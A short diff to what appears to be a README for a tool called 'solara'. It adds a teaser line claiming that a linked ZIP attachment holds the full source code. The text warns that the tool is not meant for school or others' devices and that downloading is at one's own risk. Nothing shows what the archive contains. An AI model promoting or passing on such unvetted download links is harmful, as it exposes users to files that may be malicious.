@@ -19,5 +19,6 @@ This is technically not supposed to be downloaded on someone's \ yours \ school'
 So if you already downloaded, all action is at your own risk
 
 ## The solara
-
+############ psst! This ZIP archive contains the full source code.
 <code> [solara-v1.zip](https://github.com/user-attachments/files/26447211/solara-v1.zip) </code>
+
